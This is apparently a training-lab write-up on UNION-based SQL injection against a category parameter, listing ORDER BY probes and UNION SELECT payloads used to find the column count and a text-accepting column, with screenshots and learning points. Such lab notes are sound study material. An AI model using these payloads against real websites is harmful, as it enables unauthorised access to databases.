# Lab Name
SQL injection UNION attack, finding a column containing text

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to finding a column containing text.

## Entry Point
Category parameter

## Payload Used
Determine number of columns
' ORDER BY 1--
<img width="1502" height="762" alt="1 1" src="https://github.com/user-attachments/assets/aecaada7-5e19-4e6a-a11e-34237cf2464d" />

' ORDER BY 2--
<img width="1490" height="778" alt="1 2" src="https://github.com/user-attachments/assets/71fd6f3f-16cd-42e9-b3b5-051fb27ca1f2" />

' ORDER BY 3--
<img width="1505" height="792" alt="1 3" src="https://github.com/user-attachments/assets/69badf87-2a21-400f-b9dd-671789bd48aa" />

' ORDER BY 4--
<img width="1491" height="773" alt="1 4" src="https://github.com/user-attachments/assets/b60cdba8-b756-4455-878f-e5c435ec675b" />

Test which column accept text
' UNION SELECT 'test', NULL, NULL--
<img width="1498" height="802" alt="1 5" src="https://github.com/user-attachments/assets/9d1777e1-74f0-4dc0-ad34-222ae6baf1e0" />

' UNION SELECT NULL, 'test', NULL--
<img width="1497" height="780" alt="1 6" src="https://github.com/user-attachments/assets/5ac08d4b-f186-4630-963d-047af44d0f00" />

' UNION SELECT NULL, 'test', 'test'--
<img width="1493" height="792" alt="1 7" src="https://github.com/user-attachments/assets/158b1d1d-3824-4b5a-a4d7-5d457354b73a" />


## Result
Identified that the second column containing accepts text-based data.
<img width="1497" height="780" alt="1 6" src="https://github.com/user-attachments/assets/6a93d78d-1bdc-4490-8cb9-f59bf8be298f" />


## Learning
ORDER BY is used to determine the number of columns.
UNION SELECT must match the exact number of columns.
NULL is used as a placeholder when data types are unkonwn
Text value can be tested using dummy string like 'test'.
